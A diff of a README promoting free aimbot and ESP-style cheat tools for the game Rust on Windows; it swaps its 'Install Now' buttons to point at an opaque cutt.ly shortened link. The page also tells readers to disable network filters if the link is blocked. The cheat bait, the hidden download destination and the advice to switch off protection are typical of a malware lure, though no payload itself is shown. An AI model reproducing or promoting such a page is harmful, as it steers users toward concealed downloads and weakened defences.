@@ -7,8 +7,8 @@
 **About RustEliteSurvivorPack**: RustEliteSurvivorPack is a repository for *Rust* players on Windows, offering free community-crafted tools, including aimbot-inspired targeting aids and ESP-style awareness enhancements. Dominate the unforgiving wasteland with customizations. With 160K+ visitors and 130K+ members, survive and thrive today!  
 
  
-<a href="https://rust-surviva-lhub.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Install-Now-9b6_%E2%86%92_3498db?style=gradient" alt="Install Guide Now" width="230height="45 style="border:none;">
+<a href="https://cutt.ly/3rNtNd68" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
 
@@ -22,8 +22,8 @@ Conquer *Rust* with **RustEliteSurvivorPack** on Windows:
 2. **Resolve Access Issues** 🌐  
    Disable network filters or try browsers like Edge or Firefox if needed.
 
-<a href="https://rust-surviva-lhub.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Install-Now-9b6_%E2%86%92_3498db?style=gradient" alt="Install Guide Now" width="230height="45 style="border:none;">
+<a href="https://cutt.ly/3rNtNd68" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
 ## 🛠 Why RustEliteSurvivorPack?
@@ -37,10 +37,9 @@ Conquer *Rust* with **RustEliteSurvivorPack** on Windows:
 - 📅 **Regular Updates**: New tools for your wasteland journey.
 
 
-<a href="https://rust-surviva-lhub.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Install-Now-9b6_%E2%86%92_3498db?style=gradient" alt="Install Guide Now" width="230height="45 style="border:none;">
+<a href="https://cutt.ly/3rNtNd68" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
-
 
 ## 🎮 Enhancement Scenarios
 
